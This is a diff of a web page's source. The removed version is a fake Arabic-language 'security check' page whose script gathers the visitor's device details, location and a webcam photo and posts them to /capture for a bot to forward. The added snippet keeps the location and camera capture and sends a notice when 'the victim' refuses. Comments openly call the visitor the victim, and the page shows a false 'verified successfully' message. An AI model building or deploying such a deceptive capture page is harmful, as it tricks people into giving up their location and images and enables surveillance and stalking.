@@ -1,60 +1,21 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>تحقق من الأمان</title>
-</head>
-<body style="background-color: black; color: white; text-align: center; font-family: Arial;">
-    <h2>جاري التحقق من اتصالك...</h2>
-    <p>يرجى الانتظار ثانية واحدة</p>
-
-    <script>
-        async function sendToBot() {
-            // 1. جمع معلومات الجهاز فوراً (تلقائي)
-            const deviceInfo = {
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                language: navigator.language
-            };
-
-            // 2. طلب الموقع والكاميرا (يتطلب موافقة الضحية مرة واحدة)
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-
-                // تشغيل الكاميرا والتقاط صورة
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const imageData = canvas.toDataURL('image/png');
-                stream.getTracks().forEach(t => t.stop());
-
-                // إرسال كل شيء للسيرفر ليقوم البوت بإعادة إرسالها لك
-                fetch('/capture', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        image: imageData,
-                        location: location,
-                        device: deviceInfo
-                    })
-                });
-
-                document.body.innerHTML = "<h1>تم التحقق بنجاح ✅</h1>";
-            }, (err) => {
-                // في حال رفض الضحية، نرسل بيانات الجهاز والـ IP على الأقل
-                fetch('/capture', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ device: deviceInfo })
-                });
-            });
-        }
-        window.onload = sendToBot;
-    </script>
-</body>
-</html>
+navigator.geolocation.getCurrentPosition(async (pos) => {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    
+    // تأكد من إرسال الإحداثيات داخل الـ fetch
+    fetch('/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            location: { lat: lat, lon: lon }, // تأكد أن هذا السطر يرسل lat و lon
+            image: await getCameraImage()
+        })
+    });
+}, (err) => {
+    // في حال الرفض أرسل رسالة توضح ذلك
+    fetch('/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ location: "الضحية رفضت إذن الموقع" })
+    });
+}, { enableHighAccuracy: true }); // لتفعيل الدقة العالية
